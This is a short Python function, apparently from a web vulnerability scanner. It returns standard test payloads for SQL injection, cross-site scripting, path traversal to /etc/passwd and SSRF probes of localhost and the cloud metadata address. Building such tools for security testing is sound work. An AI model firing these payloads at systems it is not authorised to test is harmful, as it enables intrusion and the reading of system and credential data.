def get_payloads(vuln_type):
    if vuln_type == "sqli":
        return [
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL--",
            "' AND SLEEP(5)--",
        ]

    if vuln_type == "xss":
        return [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
        ]

    if vuln_type == "lfi":
        return [
            "../../../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ]

    if vuln_type == "ssrf":
        return [
            "http://127.0.0.1",
            "http://169.254.169.254",
        ]

    return []
